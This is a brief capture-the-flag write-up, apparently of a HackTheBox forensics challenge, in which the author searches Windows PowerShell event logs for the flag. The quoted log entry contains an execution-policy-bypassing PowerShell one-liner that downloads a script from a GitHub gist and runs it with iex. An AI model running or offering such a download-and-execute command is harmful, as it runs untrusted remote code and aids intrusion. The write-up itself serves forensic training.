# Event Horizon

Completed: Yes
Date: July 2, 2021 → July 2, 2021
Platform: HackTheBox

After unzipping the archive, you will receive a lot of windows events files which is difficult to view.

The challenge gives us a hint. It said about powershell. Firstly, I was moving from one file to another until I used the hint and started to look at powershell files. Just did `cat Microsoft-Windows-Powershell*`. And in the end, found this artifact:

```
Host Name = ConsoleHost
        Host Version = 5.1.17763.1
        Host ID = 0612d79d-bc7f-490c-b3aa-f6952382ae8b
        Host Application = powershell -ep bypass -c iex(new-object net.webclient).downloadstring('<https://gist.githubusercontent.com/hiddenblueteamer/b1dab4113e5d0b2ed4dfa02d7853aef0/raw/ac9327b6603a911057fed868e725f7cf5a52bca4/SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1>')
        Engine Version = 5.1.17763.1
        Runspace ID = fbda02b4-bb53-4ee2-9883-c9c88304077e
        Pipeline ID = 1
        Command Name = Invoke-Expression
        Command Type = Cmdlet
        Script Name =
        Command Path =
        Sequence Number = 15
        User = WIN-PTFPHFCRDJ0\\user
        Connected User =
        Shell ID = Microsoft.PowerShell

```

Thus, the attacker just downloaded the PowerShell file from Github. The name of the file is an encoded flag.